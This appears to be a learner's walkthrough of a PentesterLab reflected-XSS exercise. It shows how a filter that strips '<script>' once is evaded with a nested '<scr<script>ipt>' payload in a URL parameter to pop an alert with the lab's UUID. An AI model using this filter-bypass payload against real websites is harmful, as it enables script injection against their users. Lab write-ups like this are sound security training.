XSS 03

You notified the developer about your bypass. 
He has added more filtering, which now seems to prevent your previous payload.
 However, he is making a terrible mistake in his code (which was also present in the previous code)...

If you keep playing around, you will realise that if you use Pentest<script>erLab for payload, you can see PentesterLab in the page. 
You can probably use that to get <script> in the page, and your alert box to pop up.

 To finish this exercise, you need to trigger a pop-up (alert or confirm) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as 
 argument <script>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</script>. 

 You can access this exercise using the following URL: http://ptl-7df0d2fe-f35a65a0.libcurl.st/. 

    Steps:
        1) Visit the given URL: http://ptl-7df0d2fe-f35a65a0.libcurl.st/. And after opening link from 'click here'.
        2) After opening that link we'll be redirected to: http://ptl-7df0d2fe-f35a65a0.libcurl.st/index.php?name=hacker
        3) Put some changes just like: hackerlol in parameter. It'll be reflected.
        4) As we know developer add filter in previous payloads:
            a) <script>alert(1)</script>
            b) <sCript>alert(1)</scRipt>
        5) Filtering blocks any malicious payload. So,let's interupt our payload as:
            pentester<script>lab
            pentesterLab

            pentester<scr<script>ipt>lab
            pentester<script>lab

            See pentester is not a malicious, nor <src and neither >ipt .
            So let's make the payload as:
            -----> http://ptl-7df0d2fe-f35a65a0.libcurl.st/index.php?name=hackerlol<scr<script>ipt>alert(1)</scr</script>ipt>
            So that we can pop-out the alert(1) in browser. Also observe the source code too.
        6) After the alert'1' be pop-out. 
                http://ptl-7df0d2fe-f35a65a0.libcurl.st/index.php?name=hackerlol<scr<script>ipt>alert(1)</scr</script>ipt>
            Again we've to alert our UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) )
            And the URL be like:
                http://ptl-7df0d2fe-f35a65a0.libcurl.st/index.php?name=hackerlol<scr<script>ipt>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</scr</script>ipt>

        7) Bravo!! We've completed this lab too.

        Happy Hacking!! :)
